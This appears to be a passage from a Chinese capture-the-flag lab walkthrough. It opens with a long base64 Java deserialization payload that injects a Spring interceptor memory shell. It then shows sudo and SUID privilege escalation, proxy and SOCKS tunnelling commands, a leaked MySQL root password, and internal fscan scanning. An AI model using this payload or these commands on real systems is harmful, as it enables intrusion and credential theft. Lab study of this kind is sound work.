NsY1YxYVNRdUJ3a3h3MlZUQkVVRTM3dmFhaWJENUxLYXFNdHlqbmlSOUZ0RndaVWNHekhPNHV3MldrTHFKSmwyTzVlZThTeDdBU3VxYkNsRnFDV3F3Z3pSVmNVL29waklOYlE1YUdPdEg0dmFnZXAzaVV1Y2ZGS2ptRlNYRFptNHFxbXRMYVlWQVNMNW5sTTBNR09GbFMvQlJ1SDhTQkxDYldxK3JIbllPNE93dGMzSnZDZzQvZzVaSkJ2RWRRNlM0NWd2Y080Z05aR01DSEs3T0xDN0pkS1h5ME1ydkFuZmZ4UVh3eUN5OWdGdGVmT282czF1SVVQcFBDVS8xSUZXU25NRENJejdsd0NMZVc1RDFia0QySUV5NGN4ejdHd2hjcWM4anh4VUU4bjRVVE9KekNWeXUxUXhoWDZUbU9sMW9MUFAzNHhuTUZXa0ZPQ3QvZVhLQVI2ZTl1TGgzRUR3Ukg4Q1BYK1BFcC9DeUZWd3UwRkg2cjluOHZLRmEwZjNLbjhPY0IvQzJGZjNEM1g0cjZQNHI0dnltODZYcmMvVGp2dndjSGNUODY3WGZROXRoR1RPQnpFZU51TVgyeWhNK2w5RW9sR2xDRjdmUlZrdDdhUTY4Y1JCMjVhdkVndmZJb1ZuSVF2UUpQWURXZVF6MmV4eHJPSm12eEdobzU0Nnd6dmQxQjZRZXBZeHVsYU9UeU1rdTZtWUI3RU9hZkNDUGhVVFRacDBXVUVNVU9odDlpOUNObVJncDk1RVRGU2NTUk1LUGlKTzNwTVlQNUpIYVMxMlhHeHlKa3Y0WHRHdnJvOUZNTWVjMzAveTROdXpYc3RiWTF6bXlNaGx2ZXhCanV2WUhHTnlqdkxSVkFmRmViWmFUVVRvVEh1T2N5L3hleklWOWtRSElhUzR0VDRuSHg0VXZKK09PUzErb3VUY2tGL1hJaEVaYkpLWm5hd0R4cExGSHBrRVZCNVU0NlRPUGx3RGtvQ3kwVXZabnBjUlhQdDVDaWxZbXgxUVJxQm1sem1SYTFlTnU4Mkh5Q1BjWE1ZajlPY1NYbUZmT1JkWXBzdkZZei8xcUJUVFpPbEZaa1M1TlpEb0hkeXVyWkExTFVXSm92SlhKQ3lsSXl2NVR2UzFPeXRJay9xdkpsbWZzWkhHNTE1ZFUxcCtUeU12N1kyK29xNXJybUJKcDVsYXFtZkZreElDc2JlY3NyS3QwRjdwVFU1OHZhREtiR0F2ZHByblVXVnpaejViQlpDSmN6UktvWkxqMzhVRWtqc1lET0JLN2phUnZORGJDa3RwTXVSRXFEbEowTW5pNXNZRkQyMEtsOURJdGREQmFGem1vaU9CVVh5elRUMmJtb2xPa3lnMUkyWUxhNTV5Wm51YjFYaDhVeTB5NHB1MlVXdzBpaHVFc3VkbEFzVW9Wa2hWa2MwaWlld2tKVlJNemZaclhnWTNoczhIdldSbm1MamZJQmhmS0dBV2xXS0Y5cG9ielpScmxWb2J3MVg2NnhBV3NtUnRkbG9LeWZRSjMxbDZqVkVPdkFnQmdLNjA0TDYyQytiTTlnN2M3RU9wTEpleHJ4VlV6Q2FpYmh6Ymh0R09JN2VKcWs2VDFFY1NmcDlwS3lsNVEzRU1GZGpNZ2J5Yk9IWEx1eG54bHlHdkVpV1c4anZ0eEdkek5LekQwM09TdnN2VFZZNWlCK1FHYlpjYnVmaUZka0lsNXZ4MjJkalhpVlF0ejhQVHJpSG9rNnJYcWxtUlFVbEMvN2pzb3QrWExiVWRsdk5sV0pIWkZFU25xT1NHOUtia2pKalFPeTU2amM5S1Rabk5NTjNJY0NOcUhKd1A4QjlSMXpYNXNZQUFBPQgAFwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAGQAaCgAWABsBAAMoKVYBAAdjb250ZXh0AQASTGphdmEvbGFuZy9PYmplY3Q7AQALaW50ZXJjZXB0b3IHAAMMABkAHQoAIQAiAQAKZ2V0Q29udGV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAAkACUKAAIAJgEADmdldEludGVyY2VwdG9yDAAoACUKAAIAKQEADmFkZEludGVyY2VwdG9yAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWDAArACwKAAIALQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAC8BABFyZXF1ZXN0QXR0cmlidXRlcwEAC2h0dHByZXF1ZXN0AQAHc2Vzc2lvbgEADnNlcnZsZXRDb250ZXh0AQATYXBwbGljYXRpb25Db250ZXh0cwEAGUxqYXZhL3V0aWwvTGlua2VkSGFzaFNldDsBABJhcHBsaWNhdGlvbkNvbnRleHQBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwA6AQAQamF2YS9sYW5nL09iamVjdAcAPAEADVN0YWNrTWFwVGFibGUBABBqYXZhL2xhbmcvVGhyZWFkBwA/AQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DABBAEIKAEAAQwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsMAEUARgoAQABHAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyCABJAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwASwBMCgA7AE0BABRnZXRSZXF1ZXN0QXR0cmlidXRlcwgATwEADGludm9rZU1ldGhvZAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DABRAFIKAAIAUwEACmdldFJlcXVlc3QIAFUMAFEAUgoAAgBXAQAKZ2V0U2Vzc2lvbggAWQwAUQBSCgACAFsBABFnZXRTZXJ2bGV0Q29udGV4dAgAXQwAUQBSCgACAF8BAEJvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnN1cHBvcnQuV2ViQXBwbGljYXRpb25Db250ZXh0VXRpbHMIAGEMAEsATAoAOwBjAQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0CABlAQAPamF2YS9sYW5nL0NsYXNzBwBnAQAcamF2YXguc2VydmxldC5TZXJ2bGV0Q29udGV4dAgAaQwASwBMCgA7AGsBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAFEAbQoAAgBuAQAxb3JnLnNwcmluZ2ZyYW1ld29yay5jb250ZXh0LnN1cHBvcnQuTGl2ZUJlYW5zVmlldwgAcAwASwBMCgA7AHIBAAtuZXdJbnN0YW5jZQwAdAAlCgBoAHUIADUBAAVnZXRGVgwAeABSCgACAHkBABdqYXZhL3V0aWwvTGlua2VkSGFzaFNldAcAewEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAfQB+CgB8AH8BABJqYXZhL3V0aWwvSXRlcmF0b3IHAIEBAARuZXh0DACDACULAIIAhAEANW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQuV2ViQXBwbGljYXRpb25Db250ZXh0CACGDABLAEwKADsAiAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAigCLCgA9AIwBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoMAI4AjwoAaACQAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAJIBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCUAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAlgEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCYAQATamF2YS9sYW5nL1Rocm93YWJsZQcAmgEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247DABBAEIKAEAApAwARQBGCgBAAKYMAA4ABgoAAgCoDABLAEwKADsAqgwAdAAlCgBoAKwMABEABgoAAgCuAQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAsACxCgACALIBAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAtAC1CgACALYIAJ4HAJ0BABFqYXZhL2xhbmcvSW50ZWdlcgcAugEABFRZUEUMALwAoQkAuwC9DAC8AKEJALsAvwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAwQDCCgBoAMMBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAMUBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAxwDICgDGAMkBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwAywDMCgC7AM0MAMsAzAoAuwDPAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADRANIKAMYA0wwAdAAlCgBoANUBABZhYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQATYWRhcHRlZEludGVyY2VwdG9ycwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL09iamVjdDs+OwEAB2dldEJlYW4IANwBABxyZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nCADeDABRAG0KAAIA4AgA2AwAeABSCgACAOMBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwDlAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDADnAOgKAOYA6QEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCADxAQAHZm9yTmFtZQwA8wBMCgBoAPQBAAxkZWNvZGVCdWZmZXIIAPYBAAlnZXRNZXRob2QMAPgAwgoAaAD5DAB0ACUKAGgA+wwA0QDSCgDGAP0BABBqYXZhLnV0aWwuQmFzZTY0CAD/DADzAEwKAGgBAQEACmdldERlY29kZXIIAQMMAPgAwgoAaAEFDADRANIKAMYBBwwAigCLCgA9AQkBAAZkZWNvZGUIAQsMAPgAwgoAaAENDADRANIKAMYBDwEADmNvbXByZXNzZWREYXRhAQADb3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAmluAQAeTGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW07AQAGdW5nemlwAQAfTGphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtOwEABmJ1ZmZlcgEAAW4BAAFJAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HARsBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtBwEdAQAdamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW0HAR8MABkAHQoBHAEhAQAFKFtCKVYMABkBIwoBHgEkAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAZASYKASABJwEABHJlYWQBAAUoW0IpSQwBKQEqCgEgASsBAAV3cml0ZQEAByhbQklJKVYMAS0BLgoBHAEvAQALdG9CeXRlQXJyYXkBAAQoKVtCDAExATIKARwBMwEABXNldEZWAQA5KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAEdmFyMAEABHZhcjEBAAN2YWwBAARnZXRGAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DAE6ATsKAAIBPAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkBwE+AQADc2V0DAFAACwKAT8BQQEAA29iagEACWZpZWxkTmFtZQEABWZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBOgE7CgACAUcMAMcAyAoBPwFJAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAUsBTAoBPwFNAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwFPAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsMAIoAiwoAPQFSAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBVAFVCgBoAVYMAMcAyAoBPwFYAQANZ2V0U3VwZXJjbGFzcwwBWgCLCgBoAVsMABkAGgoBUAFdAQAMdGFyZ2V0T2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JpYWwvZ2FkZ2V0L3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAqeXNvc2VyaWFsL2dhZGdldC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAmeXNvc2VyaWFsL2dhZGdldC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAADhAA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAIVFpZQ1VHTFhwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA==</span><br></pre></td></tr></table></figure><p>链接上去</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/4.png" alt="1"></p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/5.png" alt="1"></p><p>权限不够，最近出了一个sudo提权的漏洞， <a href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/">https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/</a> 成功得到提权拿到flag1，或者是suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">cmp /flag.txt /dev/zero -b -l</span><br></pre></td></tr></table></figure><p>搭建代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./proxy -selfcert -laddr <span class="string">&quot;0.0.0.0:10001&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> ./agent -<span class="built_in">bind</span> 0.0.0.0:10010 &gt; agent.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">connect_agent --ip 39.98.124.212:10010</span><br><span class="line"></span><br><span class="line">interface_list</span><br><span class="line">session</span><br><span class="line">autoroute</span><br><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> ./gost -L=socks://:1080 &gt; gost.log 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否开启</span></span><br><span class="line">ss -luntp</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>找到刚才的外网服务的jar包，反编译，获得mysql的用户名和密码</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/6.png" alt="1"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># THYMELEAF (ThymeleafAutoConfiguration)</span><br><span class="line">#spring.thymeleaf.cache=<span class="literal">true</span></span><br><span class="line">spring.thymeleaf.check-template=<span class="literal">true</span></span><br><span class="line">spring.thymeleaf.check-template-location=<span class="literal">true</span></span><br><span class="line">spring.thymeleaf.content-type=text/html</span><br><span class="line">spring.thymeleaf.enabled=<span class="literal">true</span></span><br><span class="line">spring.thymeleaf.encoding=UTF-<span class="number">8</span></span><br><span class="line">spring.thymeleaf.excluded-view-names=</span><br><span class="line">spring.thymeleaf.mode=HTML5</span><br><span class="line">spring.thymeleaf.prefix=classpath:/templates/</span><br><span class="line">spring.thymeleaf.suffix=.html</span><br><span class="line">server.port=<span class="number">8080</span></span><br><span class="line"></span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">spring.datasource.url=jdbc:mysql:<span class="comment">//172.16.52.45:3306/maildb?characterEncoding=utf-8&amp;useUnicode=true&amp;serverTimezone=UTC</span></span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=T%b8ds*l3v+B</span><br></pre></td></tr></table></figure><p>看这台机器的IP只看到了一个网段，但是这个网段只有一台机器，<code>netstat -an</code>查看网络连接情况</p><p><img src="/../images/achieve/2025/8/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CAoselu/7.png" alt="1"></p><p>发现还有这个网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">mail-svc@webserver:/tmp$ ./fscan -h 172.16.34.5/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.16.34.5     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.16.34.23    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 2</span></span><br><span 